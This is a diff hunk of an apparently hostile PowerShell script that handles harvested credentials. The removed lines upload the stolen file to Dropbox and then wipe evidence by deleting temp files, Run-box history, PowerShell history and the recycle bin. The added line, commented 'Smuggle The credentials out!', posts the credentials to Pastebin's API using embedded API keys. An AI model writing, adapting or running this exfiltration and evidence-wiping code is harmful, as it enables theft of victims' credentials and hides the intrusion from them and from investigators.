@@ -136,40 +136,6 @@ echo $creds >> $env:TMP\$FileName
 <#
 
 .NOTES 
-	This is to upload your files to dropbox
 #>
-
-$TargetFilePath="/$FileName"
-$SourceFilePath="$env:TMP\$FileName"
-$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
-$authorization = "Bearer " + $DropBoxAccessToken
-$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
-$headers.Add("Authorization", $authorization)
-$headers.Add("Dropbox-API-Arg", $arg)
-$headers.Add("Content-Type", 'application/octet-stream')
-Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
-
-#------------------------------------------------------------------------------------------------------------------------------------
-
-<#
-
-.NOTES 
-	This is to clean up behind you and remove any evidence to prove you were there
-#>
-
-# Delete contents of Temp folder 
-
-rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
-
-# Delete run box history
-
-reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
-
-# Delete powershell history
-
-Remove-Item (Get-PSreadlineOption).HistorySavePath
-
-# Deletes contents of recycle bin
-
-Clear-RecycleBin -Force -ErrorAction SilentlyContinue
-
+# Smuggle The credentials out!
+$null = Invoke-WebRequest -Uri 'https://pastebin.com/api/api_post.php' -Method POST -Body "api_dev_key=ask0P1pKGGS6sx4qThPNIW2Hq1hyx9YN&api_option=paste&api_user_key=497c98f25b71c824fa9111ca633f4ec6&api_paste_code=$creds"
